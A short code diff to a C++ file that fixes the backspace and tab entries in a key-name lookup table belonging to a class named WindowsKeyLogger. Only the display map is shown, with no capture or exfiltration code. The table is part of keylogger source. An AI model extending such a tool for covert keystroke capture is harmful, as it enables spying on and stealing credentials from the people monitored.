@@ -12,7 +12,7 @@
 std::map<DWORD, std::string> const spider::WindowsKeyLogger::keys = {
   { VK_ADD, "+" },
   { VK_ATTN, "[Attn]" },
-  { VK_BACK, "\t" },
+  { VK_BACK, "[Backspace]" },
   { VK_CANCEL, "[Break]" },
   { VK_CLEAR, "[Clear]" },
   { VK_CRSEL, "[Cr Sel]" },
@@ -71,7 +71,7 @@ std::map<DWORD, std::string> const spider::WindowsKeyLogger::keys = {
   { VK_SEPARATOR, "[Separator]" },
   { VK_SPACE, " " },
   { VK_SUBTRACT, "-" },
-  { VK_TAB, "[Tab]" },
+  { VK_TAB, "\t" },
   { VK_ZOOM, "[Zoom]" },
   { VK_ACCEPT, "[Accept]" },
   { VK_APPS, "[Context Menu]" },
